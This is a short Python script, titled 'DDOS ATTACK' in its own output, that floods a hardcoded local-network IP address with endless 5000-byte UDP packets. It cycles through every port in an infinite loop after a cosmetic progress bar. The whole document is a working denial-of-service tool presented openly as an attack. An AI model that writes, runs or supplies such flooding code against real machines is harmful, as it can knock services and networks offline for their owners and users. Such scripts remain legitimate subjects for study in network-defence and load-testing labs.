import os
import time
import socket
import random


# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(5000)
# Generate random bytes (fake data) to send
os.system("clear")

print ("\n---------      D D O S     A T T A C K     ---------")
ip = '192.168.5.124'   #  Target machine's IP address on local network
port = 1024


print ("\nThe IP address of the Host to Attack is : ", ip)
print ("\nThe PORT address of the Host to Attack is : ", port)
print ("\n\n")

print ("[                    ] 0% ")
time.sleep(2)
print ("[=====               ] 25%")
time.sleep(2)
print ("[==========          ] 50%")
time.sleep(2)
print ("[===============     ] 75%")
time.sleep(2)
print ("[====================] 100%")
time.sleep(2)
print ("\n\n")

sent = 0
while True:
     sock.sendto(bytes, (ip, port))  # Send 5000 bytes to the target IP & port
     sent = sent + 1                 # Increment packet counter
     port = port + 1                 # Use next port number

     print ("Sent %s packet to %s through port:%s" % (sent, ip, port))

     if port == 65534:
         port = 1  # Wrap around when max port is reached
